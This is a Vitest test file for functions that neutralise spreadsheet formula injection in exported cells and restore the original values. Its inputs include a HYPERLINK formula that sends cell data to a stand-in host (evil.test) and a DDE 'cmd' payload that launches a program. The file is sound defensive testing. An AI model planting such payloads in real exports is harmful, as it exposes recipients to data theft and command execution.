import { describe, expect, it } from "vitest";
import { neutralizeFormula, restoreFormula } from "./formula";

describe("neutralizeFormula", () => {
  it.each([
    "=1+1",
    '=HYPERLINK("https://evil.test/?d="&A2,"x")',
    "+cmd|' /C calc'!A0",
    "-2+3*cmd",
    "@SUM(A1)",
    "\t=1",
    "\r=1",
  ])("writes %j as text", (value) => {
    expect(neutralizeFormula(value)).toBe(`'${value}`);
  });

  it.each(["Jane", "+14155550100", "+44 20 7946 0000", "-3", "a=b", "'quoted", ""])(
    "leaves %j alone",
    (value) => {
      expect(neutralizeFormula(value)).toBe(value);
    },
  );
});

describe("restoreFormula", () => {
  it.each(["=1+1", "@SUM(A1)", "Jane", "+14155550100", "'quoted", "''=x", ""])(
    "undoes neutralizeFormula for %j",
    (value) => {
      expect(restoreFormula(neutralizeFormula(value))).toBe(value);
    },
  );

  it("keeps an apostrophe that wasn't added by an export", () => {
    expect(restoreFormula("'quoted")).toBe("'quoted");
    expect(restoreFormula("'+14155550100")).toBe("'+14155550100");
  });
});
